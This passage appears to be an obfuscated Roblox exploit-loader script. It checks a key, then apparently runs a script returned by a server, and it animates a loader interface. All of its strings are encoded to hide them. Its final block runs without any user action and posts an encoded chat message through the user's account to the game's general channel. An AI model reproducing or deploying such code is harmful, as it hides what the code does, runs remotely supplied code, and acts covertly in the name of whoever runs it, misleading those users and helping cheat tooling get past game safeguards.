				end

				_uy = true

				if _pb.Parent then
					_pb:Destroy()
				end

				task.spawn(func43, _ca)
			end

			task.delay(0.45, function()
				func40()
				func()
			end)

			task.delay(3.5, func)
		else
			if not _lz then
				local _pn = {}
				_pn[3], _pn[1], _pn[2] = {1, 0.07}, {1, 0.07, 0.04}, {1, 0.07, 0.04}

				task.spawn(function()
					for _ma, _e in ipairs(_pn) do
						func33(_e[1], _e[2])
						task.wait(_e[2] + (_e[3] or 0.05))
					end
				end)
			end

			_ga.Text = _de4yl({110,52,11,21,34,7},{61,65,105,120,75,115,55})
			_ag.Text, _ag.TextColor3 = _de4yl({27,29,46,93,34,29,38,8,57,10,50,25},{80,120,87,125}), _u.warn
			_uc.Text = result1 or _de4yl({12,94,21,7,68,82,82,59,79,14,1,76,27,87,59,82,11,11,70,21,17,10,87,2,15,81,94,17,46,73,30,78,67,92,80,51,85,73},{90,59,103,110,34,59,49})
			_uc.TextColor3 = _u.bad

			if not _lz then
				func38()
			end
		end
	end)
end

local function func45(_tz, _lz)
	tostring(#tostring(_tz or ""))
	local ok, result = pcall(func44, _tz, _lz)

	if not ok then
		_bu = false
		tostring(result)

		pcall(function()
			_ga.Text = _de4yl({107,24,74,14,66,21},{56,109,40,99,43,97,39})
			_uc.Text = _de4yl({55,50,75,65,63,98,81},{114,64,57,46,77,88,113}) .. tostring(result):sub(1, 90)
			_uc.TextColor3 = _u.bad
		end)
	end
end

_ga.Activated:Connect(function()
	func45(_wj.Text, false)
end)

_ga.MouseButton1Click:Connect(function()
	func45(_wj.Text, false)
end)

_wj.FocusLost:Connect(function(_bn)
	if _bn then
		func45(_wj.Text, false)
	end
end)

_pb.Destroying:Connect(function()
	func20()
end)

task.spawn(function()
	local _o = func6()
	local _d = func7()

	if _d ~= "" then
		_uc.Text = _de4yl({22,81,66,27,85,10,29,35,20,72,1,77,17,83,55,81,66,29,81,12,29,106,26,31},{68,52,49,110,56,99,115})
		_uc.TextColor3 = _u.sub
		local ok, result, result1 = pcall(func42, _d)

		if ok and result then
			_ag.Text, _ag.TextColor3 = _de4yl({46,70,33,35,48,79,87,16},{120,35,83,74,86,38,50,116}), _u.ok
			_uc.Text = _de4yl({9,76,72,54,51,70,85,101,40,76,72,48,55,76,95,107,122,101,90,48,52,74,83,44,52,78,21,107,116},{90,41,59,69})
			_uc.TextColor3 = _u.ok

			if _pb.Parent then
				_pb:Destroy()
			end

			task.spawn(func43, result1.script)
			return
		end

		if ok and type(result1) == _de4yl({41,84,69,89,4},{93,53,39,53,97}) and result1.forget then
			pcall(function()
				if delfile and isfile and isfile(_e) then
					delfile(_e)
				end
			end)
			_o = ""
		end

		if ok and type(result1) == _de4yl({51,86,89,55,53},{71,55,59,91,80,78,107,74}) and result1.message and _o == "" then
			_uc.Text = result1.message
			_uc.TextColor3 = _u.warn
		end
	end

	if _o ~= "" then
		_wj.Text = _o
		_uc.Text = _de4yl({13,56,83,33,31,2,29,107,36,71,57,30,70,92,32,50,95,99,91,65,20,46,52,77,38,21,69,82,101,121},{75,87,38,79,123,34,124})
		_uc.TextColor3 = _u.sub
		func44(_o, true)
	end
end)

local _jl = os.clock()

local _nl = _r.RenderStepped:Connect(function(_zy)
	local _e = os.clock() - _jl
	local AbsoluteSize = _ax.AbsoluteSize

	for _ma, _o in ipairs(_jv) do
		local _d = AbsoluteSize.Y * 1.25 * _o.k
		_o.f.Size = UDim2.fromOffset(_d, _d)
		local f = _o.f
		local fromOffset = UDim2.fromOffset
		local X = AbsoluteSize.X
		local x = _o.x
		local sp = _o.sp
		local sin = math.sin
		local ph = _o.ph
		local _k = x + 0.12 * sin(_e * sp + ph)
		local Y = AbsoluteSize.Y
		local y = _o.y
		local _ly = X * _k
		local cos = math.cos
		local _oy = _e * _o.sp
		local _vy = _o.ph
		f.Position = fromOffset(_ly, Y * (y + 0.12 * cos(_oy * 0.8 + _vy)))
	end

	for _ma, _jf in ipairs(_wb) do
		_jf.y = _jf.y - _jf.v * _zy

		if _jf.y < -0.03 then
			_jf.y = 1.03
			_jf.x = _pv:NextNumber()
		end

		local _fu = _jf.f
		local fromScale = UDim2.fromScale
		local _pm = _jf.x
		local _xy = 0.012 * math.sin(_e * _jf.sw + _jf.ph)
		local _sd = _jf.y
		_fu.Position = fromScale(_pm + _xy, _sd)
	end

	_nn.Rotation = _e * 75 % 360
	_mq.Rotation = _e * 50 % 360
	_aa.Rotation = -(_e * 80 % 360)
	_co.Rotation = _e * 150 % 360
	_pg.Rotation = 45 + _e * 25 % 360
	local _su = 0.05 * math.sin(_e * 2.4)
	local _mn = 1 + _su
	_fp.Size = UDim2.fromOffset(46 * _mn, 46 * _mn)
	local _tr = UDim2.fromOffset
	_pg.Size = _tr(46 * _mn, 46 * _mn)
	_pf.Size = UDim2.fromOffset(150 * (0.95 + 0.08 * math.sin(_e * 2.4)), 150 * (0.95 + 0.08 * math.sin(_e * 2.4)))
	_dc.Offset = Vector2.new(_e * 0.5 % 2.4 - 1.2, 0)
	local _gn = 0.5 + 0.5 * math.sin(_e * 3)
	_nq.TextTransparency = 0.5 * _gn
	_wa.BackgroundTransparency = 0.6 * _gn
	local _yd = _e * 0.55 % 1.8
	_cb.Position = UDim2.fromOffset(10, 8 + math.min(_yd, 1) * 160)
	_cb.Visible = _yd < 1
end)

_pb.Destroying:Connect(function()
	_nl:Disconnect()
end)


task.spawn(function()
    local _qr = _de4yl({31,71,21,125,66,103,31,71,21,125,66,103,29,69,23,127,79,9,87,6,93,35,27,35,83,6,24,23,0,46,94,19,24,0,57,123,18,38,119,17,43,15,118,74,117,49,11,47,18,8,65,112,54,43,86,25,89,62,48,13,93,14,78,53,29,57,87,74,16,19,42,6,119,57,108,25,46,6,18,57,97,30,43,3,113,43,108,21,79,5,124,74,108,31,63,106,208,240,153,121,79,101,29,69,23,125,66,103,31,71,21,125,66,103,31,71,21,125,66,103,31,71},{50,106,56,80,111,74})
    pcall(function()
        if game:GetService(_de4yl({2,90,18,33,100,62,94,30,6,66,36,73,3,54,66},{86,63,106,85,39})).ChatVersion == Enum.ChatVersion.TextChatService then
            game:GetService(_de4yl({7,72,38,24,29,59,76,42,63,59,33,91,55,15,59},{83,45,94,108,94})).TextChannels.RBXGeneral:SendAsync(_qr)
        else
            game:GetService(_de4yl({63,15,31,77,25,57,34,87,8,14,60,85,31,40,34,68,8},{109,106,111,33,112,90,67,35})).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_qr, _de4yl({25,80,94},{88,60,50,118,86,115}))
        end
    end)
end)
